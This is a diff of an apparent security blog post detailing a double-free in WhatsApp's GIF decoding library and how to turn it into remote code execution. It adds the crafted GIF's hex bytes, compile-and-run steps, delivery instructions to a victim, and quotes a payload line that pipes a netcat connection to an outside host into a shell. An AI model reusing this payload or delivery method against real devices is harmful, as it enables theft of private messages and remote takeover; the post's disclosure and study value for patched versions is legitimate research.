@@ -10,10 +10,11 @@ header:
 
 In this blog post, I'm going to share about a double-free vulnerability that I discovered in WhatsApp, and how I turn it into an RCE.
 
-# Demo
+## Demo
+
 [https://drive.google.com/file/d/1T-v5XG8yQuiPojeMpOAG6UGr2TYpocIj/view](https://drive.google.com/file/d/1T-v5XG8yQuiPojeMpOAG6UGr2TYpocIj/view)
 
-# Double-free vulnerability in DDGifSlurp in decoding.c in libpl_droidsonroids_gif
+## Double-free vulnerability in DDGifSlurp in decoding.c in libpl_droidsonroids_gif
 
 When a WhatsApp user opens Gallery view in WhatsApp to send a media file, WhatsApp parses it with a native library called `libpl_droidsonroids_gif.so` to generate the preview of the GIF file. `libpl_droidsonroids_gif.so` is an open-source library with source codes available at [https://github.com/koral--/android-gif-drawable/tree/dev/android-gif-drawable/src/main/c](https://github.com/koral--/android-gif-drawable/tree/dev/android-gif-drawable/src/main/c).
 
@@ -110,7 +111,7 @@ We then craft a GIF file with three frames of below sizes:
 
 When the WhatsApp Gallery is opened, the said GIF file triggers the double-free bug on rasterBits buffer with sizeof(GifInfo). Interestingly, in WhatsApp Gallery, a GIF file is parsed twice. When the said GIF file is parsed again, another GifInfo object is created. Bacause of the double-free behavior in Android, GifInfo object and rasterBits will point to the same address. DDGifSlurp() will then decode the first frame to rasterBits buffer, thus overwriting struct GifInfo and its rewindFunction(), which is called right at the end of DDGifSlurp() function.
 
-# Controlling PC register
+## Controlling PC register
 The GIF file that we need to craft is as below:
 
 ```
@@ -215,7 +216,8 @@ The above GIF triggers crash as below:
 10-02 11:09:38.499 18071 18071 F DEBUG   :     #02 pc 00000000000004ec  [vdso:0000007e2e4b0000]
 10-02 11:09:38.499 18071 18071 F DEBUG   :     #03 pc deadbeeefffffffc  <unknown>
 ```
-# Deal with ASLR and W^X
+
+## Deal with ASLR and W^X
 After controlling the PC, to achieve remote code execution. The easiest way to to execute the below command:
 ```
 system("toybox nc 192.168.2.72 4444 | sh");
@@ -243,7 +245,49 @@ Let say the address of the above gadget is AAAAAAAA and the address of system() 
 00000080: 4141 4141 4141 4141 eeff                 AAAAAAAA..
 ```
 Now to find out AAAAAAAA and BBBBBBBB, we need an information disclosure vulnerability that gives us the base address of libc.so and libhwui.so. That vulnerability is not in the scope of this blogpost.
-# Putting everything together
+
+## Putting everything together
+
+Just compile the code that I attached in the Appendix and run the code to generate the corrupted GIF file:
+```
+notroot@osboxes:~/Desktop/gif$ gcc -o exploit egif_lib.c exploit.c
+.....
+.....
+.....
+notroot@osboxes:~/Desktop/gif$ ./exploit
+buffer = 0x7ffc586cd8b0 size = 266
+47 49 46 38 39 61 18 00 0A 00 F2 00 00 66 CC CC
+FF FF FF 00 00 00 33 99 66 99 FF CC 00 00 00 00
+00 00 00 00 00 2C 00 00 00 00 08 00 15 00 00 08
+9C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 84 9C 09 B0
+C5 07 00 00 00 74 DE E4 11 F3 06 0F 08 37 63 40
+C4 C8 21 C3 45 0C 1B 38 5C C8 70 71 43 06 08 1A
+34 68 D0 00 C1 07 C4 1C 34 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 54 12 7C C0 C5 07 00 00 00 EE FF FF 2C 00 00
+00 00 1C 0F 00 00 00 00 2C 00 00 00 00 1C 0F 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 2C 00 00 00 00
+18 00 0A 00 0F 00 01 00 00 3B
+```
+Then copy the content into a GIF file and send it as Document with WhatsApp to the victime. Take note that it must not be sent as a Media file, otherwise WhatsApp tries to convert it into an MP4 before sending.
+Upon the user receives the malicous GIF file, nothing will happen until the user open WhatsApp Gallery to send a media file to his/her friend.
+
+## Affected versions
+The exploit works well until WhatsApp version 2.19.230. The vulnerability is official patched in WhatsApp version 2.19.244
+
+## Attack vector
+With the above exploitation, we can have two attack vectors:
+
+1. A malicious app is installed on the Android device. The app collects addresses of zygote libraries and generates a malicious GIF file that results in code execution in WhatsApp context. This allows the malware app to steal files in WhatsApp sandbox including message database.
+2. Pairing with an application that has an information leak vulnerability (e.g. browser), the attacker can collect the addresses of zygote libraries and craft a malicious GIF file to send it to the user via WhatsApp (must be as an attachment, not as an image through Gallery Picker). When the user opens the Gallery view in WhatsApp, the GIF file will trigger a remote shell in WhatsApp context.
+
+## Appendix
+
 exploit.c
 ```c
 #include "gif_lib.h"
